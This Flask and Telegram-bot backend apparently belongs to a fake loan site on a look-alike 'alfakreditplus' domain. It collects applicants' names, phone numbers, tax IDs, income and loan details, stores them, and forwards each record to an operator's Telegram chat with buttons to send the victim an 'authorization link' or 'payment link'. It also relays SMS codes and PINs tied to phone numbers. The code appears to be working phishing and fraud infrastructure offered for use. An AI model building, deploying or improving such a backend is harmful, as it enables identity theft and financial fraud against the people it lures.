import os
import sqlite3
import secrets
import random
import asyncio
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ========== КОНФИГ ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru/page_56637/")

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS applications
                 (id INTEGER PRIMARY KEY, fullname TEXT, phone TEXT, inn TEXT,
                  income REAL, term INTEGER, amount REAL, payment REAL,
                  session_id TEXT, status TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (session_id TEXT PRIMARY KEY, phone TEXT, sms_code TEXT, pin_code TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ========== FLASK API ==========
app = Flask(__name__)
CORS(app)

def send_to_admin(text, keyboard=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if keyboard:
        data["reply_markup"] = keyboard
    requests.post(url, json=data)

def get_keyboard(session_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Ссылка на авторизацию", callback_data=f"auth:{session_id}")],
        [InlineKeyboardButton(text="💳 Ссылка на оплату", callback_data=f"payment:{session_id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{session_id}")]
    ])

@app.route('/submit_credit_application', methods=['POST'])
def submit_application():
    data = request.json
    session_id = secrets.token_hex(8)
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('''INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (data['fullname'], data['phone'], data.get('inn', ''), data['income'],
               data['term'], data['amount'], data['payment'], session_id))
    conn.commit()
    conn.close()
    
    msg = f"🆕 <b>НОВАЯ ЗАЯВКА</b>\n\n👤 {data['fullname']}\n📱 {data['phone']}\n💰 {data['amount']} BYN\n📅 {data['term']} мес"
    send_to_admin(msg, get_keyboard(session_id))
    
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    sms_code = str(random.randint(10000, 99999))
    pin_code = str(random.randint(1000, 9999))
    
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code) VALUES (?, ?, ?, ?)',
              (session_id, phone, sms_code, pin_code))
    conn.commit()
    conn.close()
    
    send_to_admin(f"📱 ЗАПРОС АВТОРИЗАЦИИ\n\nСессия: {session_id}\nТелефон: {phone}\n\nSMS: {sms_code}\nPIN: {pin_code}")
    return jsonify({"status": "ok"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT sms_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
    row = c.fetchone()
    conn.close()
    if row and row[0] == data['code']:
        return jsonify({"status": "ok", "next_step": "pin"})
    return jsonify({"status": "error", "message": "Неверный код"})

@app.route('/submit_pin', methods=['POST'])
def submit_pin():
    data = request.json
    conn = sqlite3.connect('applications.db')
    c = conn.cursor()
    c.execute('SELECT pin_code FROM auth_sessions WHERE session_id = ?', (data['session_id'],))
    row = c.fetchone()
    conn.close()
    if row and row[0] == data['pin']:
        send_to_admin(f"✅ АВТОРИЗАЦИЯ УСПЕШНА!\n\nСессия: {data['session_id']}")
        return jsonify({"status": "ok", "authorized": True})
    return jsonify({"status": "error", "message": "Неверный PIN"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
